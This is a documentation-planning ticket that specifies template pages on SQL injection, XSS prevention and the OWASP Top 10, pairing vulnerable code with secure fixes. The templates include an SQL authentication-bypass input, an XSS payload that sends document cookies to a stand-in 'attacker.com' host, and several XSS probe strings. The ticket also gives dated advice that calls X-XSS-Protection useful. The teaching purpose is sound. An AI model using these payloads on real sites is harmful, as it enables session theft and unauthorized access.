# P1-T03: Create Security Essentials Pages

**Phase:** 1 - Foundation
**Week:** 1 - Content Completion
**Priority:** Critical
**Effort:** 12 hours
**Status:** Not Started

---

## Objective

Create foundational web security content covering SQL Injection, XSS prevention, and OWASP Top 10 to address critical security gaps and resolve TODO references in API design pages.

## Context

Security topics are referenced but content is missing:
- SQL Injection prevention (referenced in `restful-api-design.md`)
- XSS prevention (referenced in `restful-api-design.md`)
- General web security best practices needed

Only 25% of planned cyber-security content exists. This ticket addresses the highest priority items.

## Success Criteria

- [ ] 3 new security pages created
- [ ] Each page includes attack vectors and prevention techniques
- [ ] Code examples for vulnerable and secure implementations
- [ ] Linked from API design and cyber-security sections
- [ ] Added to relevant learning paths (Web API Developer, Frontend Developer)

## Deliverables

### 1. sql-injection.md (4 hours)

**File Path:** `docs/pages/cyber-security/web-security/sql-injection.md`

**Content Requirements:**

```markdown
# SQL Injection

![Intermediate](https://img.shields.io/badge/Level-Intermediate-yellow)
![Security](https://img.shields.io/badge/Type-Security-red)

---

## Table of Contents
[Auto-generated TOC]

---

## What is SQL Injection?

[Definition and impact]
[OWASP ranking (#3 in OWASP Top 10 2021)]
[Real-world examples of breaches]

## How SQL Injection Works

### Attack Vectors

**Example: Authentication Bypass**

**Vulnerable Code (Java):**
```java
String query = "SELECT * FROM users WHERE username = '"
    + username + "' AND password = '" + password + "'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);
```

**Malicious Input:**
```
Username: admin' OR '1'='1
Password: anything
```

**Resulting Query:**
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'anything'
```
[Explanation: Always returns true]

### Types of SQL Injection

1. **Classic SQL Injection** - Direct query manipulation
2. **Blind SQL Injection** - Inference-based attacks
3. **Second-Order SQL Injection** - Stored malicious data

## Prevention Techniques

### 1. Parameterized Queries (Prepared Statements)

**✅ Secure Implementation (Java/JDBC):**
```java
String query = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, username);
pstmt.setString(2, password);
ResultSet rs = pstmt.executeQuery();
```

**✅ Secure Implementation (Spring JdbcTemplate):**
```java
String query = "SELECT * FROM users WHERE username = ? AND password = ?";
List<User> users = jdbcTemplate.query(query,
    new Object[]{username, password},
    new UserRowMapper());
```

**✅ Secure Implementation (JPA/Hibernate):**
```java
String jpql = "SELECT u FROM User u WHERE u.username = :username AND u.password = :password";
TypedQuery<User> query = entityManager.createQuery(jpql, User.class);
query.setParameter("username", username);
query.setParameter("password", password);
User user = query.getSingleResult();
```

### 2. Input Validation

[Whitelist approach]
[Regular expressions for validation]
[Length limits]

```java
// Validate username contains only alphanumeric characters
if (!username.matches("^[a-zA-Z0-9_]{3,20}$")) {
    throw new IllegalArgumentException("Invalid username format");
}
```

### 3. Stored Procedures

[When and how to use]
[Still need parameterization]

### 4. ORM Frameworks

[Benefits and limitations]
[JPA, Hibernate, MyBatis]

### 5. Least Privilege Principle

[Database user permissions]
[Separate read/write accounts]

### 6. WAF (Web Application Firewall)

[Additional layer of defense]
[Pattern recognition]

## Framework-Specific Prevention

### Spring Boot
[Spring Security configuration]
[JPA best practices]

### Node.js
[Sequelize ORM]
[Parameterized queries with mysql2]

### Python
[SQLAlchemy]
[Django ORM]

## Testing for SQL Injection

### Manual Testing
[Common payloads to test]

### Automated Testing Tools
- SQLMap (penetration testing)
- OWASP ZAP
- Burp Suite

## Common Mistakes

### ❌ 1. String Concatenation
[Never build queries with string concatenation]

### ❌ 2. Escaping Characters
[Not sufficient - still vulnerable]

### ❌ 3. Client-Side Validation Only
[Always validate server-side]

## Security Checklist

- [ ] All SQL queries use parameterized statements
- [ ] Input validation on all user inputs
- [ ] Database users have minimal required permissions
- [ ] ORM framework used correctly (no raw queries)
- [ ] Regular security testing performed
- [ ] Error messages don't reveal database structure

<sub>[Back to top](#table-of-contents)</sub>

---

## Ref.

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [PortSwigger SQL Injection Guide](https://portswigger.net/web-security/sql-injection)

---

[Get Started](../../../get-started.md) | [Cyber-security](../../../get-started.md#cyber-security-fundamentals)

---
```

### 2. xss-prevention.md (4 hours)

**File Path:** `docs/pages/cyber-security/web-security/xss-prevention.md`

**Content Requirements:**

```markdown
# Cross-Site Scripting (XSS) Prevention

![Intermediate](https://img.shields.io/badge/Level-Intermediate-yellow)
![Security](https://img.shields.io/badge/Type-Security-red)

---

## What is XSS?

[Definition]
[OWASP ranking (#3 in OWASP Top 10 2021)]
[Impact: session hijacking, credential theft, defacement]

## Types of XSS

### 1. Reflected XSS
[Definition and example]
[Attack flow diagram with Mermaid]

**Example Attack:**
```
https://vulnerable-site.com/search?q=<script>alert(document.cookie)</script>
```

### 2. Stored XSS
[More dangerous - persistent]
[Example: comment section, profile fields]

### 3. DOM-Based XSS
[Client-side JavaScript manipulation]

## How XSS Works

### Example Attack Scenario

**Vulnerable Code (Java/JSP):**
```jsp
<div>
  Welcome, <%= request.getParameter("username") %>
</div>
```

**Malicious Input:**
```
username=<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
```

## Prevention Techniques

### 1. Output Encoding/Escaping

**✅ Java (JSTL with escapeXml):**
```jsp
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<div>
  Welcome, <c:out value="${username}" escapeXml="true"/>
</div>
```

**✅ Java (OWASP Java Encoder):**
```java
import org.owasp.encoder.Encode;

String safe = Encode.forHtml(userInput);
response.getWriter().println("<div>" + safe + "</div>");
```

**✅ JavaScript:**
```javascript
// Use textContent instead of innerHTML
element.textContent = userInput;

// If HTML is needed, use DOMPurify
element.innerHTML = DOMPurify.sanitize(userInput);
```

**✅ React (automatic escaping):**
```jsx
// React automatically escapes values
<div>Welcome, {username}</div>
```

### 2. Content Security Policy (CSP)

[HTTP header to restrict script sources]

**Example CSP Header:**
```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com
```

**Spring Boot Configuration:**
```java
@Configuration
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.headers()
            .contentSecurityPolicy("default-src 'self'; script-src 'self'");
        return http.build();
    }
}
```

### 3. Input Validation

[Whitelist approach]
[Sanitization libraries]

```java
// Validate input format
if (!email.matches("^[A-Za-z0-9+_.-]+@(.+)$")) {
    throw new IllegalArgumentException("Invalid email format");
}
```

### 4. HTTPOnly Cookies

[Prevent JavaScript access to cookies]

```java
Cookie cookie = new Cookie("sessionId", sessionId);
cookie.setHttpOnly(true);  // Prevent XSS from stealing cookie
cookie.setSecure(true);    // HTTPS only
response.addCookie(cookie);
```

### 5. X-XSS-Protection Header

[Browser XSS filter - legacy but still useful]

```
X-XSS-Protection: 1; mode=block
```

## Framework-Specific Prevention

### Spring Boot
[Thymeleaf auto-escaping]
[Spring Security headers]

### React
[Automatic escaping]
[DangerouslySetInnerHTML - avoid]

### Angular
[Sanitization service]
[Bypass methods - when to use]

### Vue.js
[v-html directive - careful usage]

## Context-Specific Encoding

### HTML Context
```java
Encode.forHtml(userInput)
```

### JavaScript Context
```java
Encode.forJavaScript(userInput)
```

### URL Context
```java
Encode.forUriComponent(userInput)
```

### CSS Context
```java
Encode.forCssString(userInput)
```

## Testing for XSS

### Manual Testing
[Common XSS payloads]

```
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

### Automated Testing
- OWASP ZAP
- Burp Suite
- XSS Hunter

## Common Mistakes

### ❌ 1. Client-Side Validation Only
### ❌ 2. Blacklist Filtering
### ❌ 3. Using innerHTML with User Input
### ❌ 4. Incomplete Encoding

## Security Checklist

- [ ] All user input is encoded before output
- [ ] CSP header configured
- [ ] HTTPOnly flag on cookies
- [ ] Framework auto-escaping enabled
- [ ] Regular security scanning performed
- [ ] No use of dangerouslySetInnerHTML or innerHTML with user data

<sub>[Back to top](#table-of-contents)</sub>

---

## Ref.

- [OWASP XSS](https://owasp.org/www-community/attacks/xss/)
- [XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [OWASP Java Encoder](https://owasp.org/www-project-java-encoder/)
- [DOMPurify](https://github.com/cure53/DOMPurify)

---

[Get Started](../../../get-started.md) | [Cyber-security](../../../get-started.md#cyber-security-fundamentals)

---
```

### 3. owasp-top-10.md (4 hours)

**File Path:** `docs/pages/cyber-security/owasp-top-10.md`

**Content Requirements:**

```markdown
# OWASP Top 10

![Beginner](https://img.shields.io/badge/Level-Beginner-green)
![Security](https://img.shields.io/badge/Type-Security-red)

---

## What is OWASP Top 10?

[Industry standard for web application security risks]
[Updated regularly - focus on 2021 edition]
[Why it matters for developers]

## OWASP Top 10 (2021)

### A01:2021 - Broken Access Control
[Description]
[Examples: IDOR, privilege escalation]
[Prevention: proper authorization checks]
[Link to IAM page]

### A02:2021 - Cryptographic Failures
[Sensitive data exposure]
[Prevention: encryption at rest and in transit]

### A03:2021 - Injection
[SQL, NoSQL, LDAP, OS command injection]
[Link to SQL Injection page]
[Link to XSS Prevention page]

### A04:2021 - Insecure Design
[Security by design]
[Threat modeling]

### A05:2021 - Security Misconfiguration
[Default credentials]
[Unnecessary features enabled]
[Missing security headers]

### A06:2021 - Vulnerable and Outdated Components
[Dependency management]
[Regular updates]

### A07:2021 - Identification and Authentication Failures
[Weak passwords]
[Session management issues]
[Link to OAuth, JWT pages]

### A08:2021 - Software and Data Integrity Failures
[Unsigned updates]
[Insecure CI/CD pipelines]

### A09:2021 - Security Logging and Monitoring Failures
[Insufficient logging]
[No alerting on suspicious activity]

### A10:2021 - Server-Side Request Forgery (SSRF)
[Fetching remote resources without validation]
[Prevention techniques]

## Quick Reference Table

| Rank | Category | Risk | Prevention |
|------|----------|------|------------|
| A01 | Broken Access Control | High | Enforce authorization on every request |
| A02 | Cryptographic Failures | High | Encrypt sensitive data, use TLS |
| A03 | Injection | High | Parameterized queries, input validation |
| ... | ... | ... | ... |

## Security Implementation Checklist

[General checklist for all 10 categories]

<sub>[Back to top](#table-of-contents)</sub>

---

## Ref.

- [OWASP Top 10 - 2021](https://owasp.org/Top10/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

---
```

## Technical Requirements

### Directory Structure
Create new directory:
```
docs/pages/cyber-security/web-security/
├── sql-injection.md
└── xss-prevention.md
```

### Code Examples
- Show both vulnerable and secure code
- Multiple languages where relevant (Java, JavaScript, Python)
- Tested and working examples
- Clear comments explaining why code is secure/insecure

### Diagrams
- Attack flow diagrams (Mermaid sequence diagrams)
- Prevention technique flowcharts
- Keep visual and simple

### Cross-References
Update these pages:
- `docs/pages/ws-and-api-design/restful/restful-api-design.md` - link SQL injection and XSS sections
- `docs/get-started.md` - expand Cyber-security section
- `docs/pages/cyber-security/access-control-and-authn/iam.md` - cross-reference

### Front Matter
```yaml
---
title: "[Topic Name]"
tags: [security, web-security, owasp, vulnerability]
category: cyber-security
difficulty: intermediate
prerequisites:
  - web-development-basics
  - http-basics
estimated_reading_time: 12-15
---
```

## Acceptance Criteria

**Content Quality:**
- [ ] Clear explanation of attack vectors
- [ ] Vulnerable code examples shown
- [ ] Secure implementation examples provided
- [ ] Framework-specific guidance included
- [ ] Testing methods documented

**Practical Value:**
- [ ] Code examples are copy-pasteable and working
- [ ] Checklists for developers included
- [ ] Links to tools for testing
- [ ] Real-world context provided

**Integration:**
- [ ] All TODO references in API design pages resolved
- [ ] Added to relevant learning paths
- [ ] Cross-referenced in related security topics
- [ ] Linked from get-started.md

**Security Standards:**
- [ ] Follows OWASP guidelines
- [ ] Up-to-date with current best practices
- [ ] Links to official OWASP resources
- [ ] No promotion of insecure practices

## Testing Checklist

- [ ] All code examples are syntactically correct
- [ ] Security claims are accurate and verified
- [ ] External OWASP links are valid
- [ ] No broken internal links
- [ ] Mobile-friendly rendering

## Dependencies

**Prerequisites:**
- Understanding of web application architecture
- Basic HTTP knowledge

**Related Tickets:**
- P1-T02 (OpenAPI - can reference security schemes)
- P1-T06 (Related Topics - link these pages)
- P2-T04 (Knowledge checks - add security quizzes)

## Resources

**Official OWASP:**
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP XSS](https://owasp.org/www-community/attacks/xss/)
- [OWASP Top 10](https://owasp.org/Top10/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)

**Tools:**
- [OWASP Java Encoder](https://owasp.org/www-project-java-encoder/)
- [DOMPurify](https://github.com/cure53/DOMPurify)
- [OWASP ZAP](https://www.zaproxy.org/)

**Examples:**
- [OWASP WebGoat](https://github.com/WebGoat/WebGoat) - vulnerable app for testing

## Notes

- This is critical security content - accuracy is paramount
- Consider adding "Security Warning" badges to dangerous code examples
- These pages will likely be high-traffic (security is always a concern)
- Keep updated as OWASP Top 10 evolves

## Assignee

TBD (requires security knowledge)

## Due Date

End of Week 1 (Phase 1)
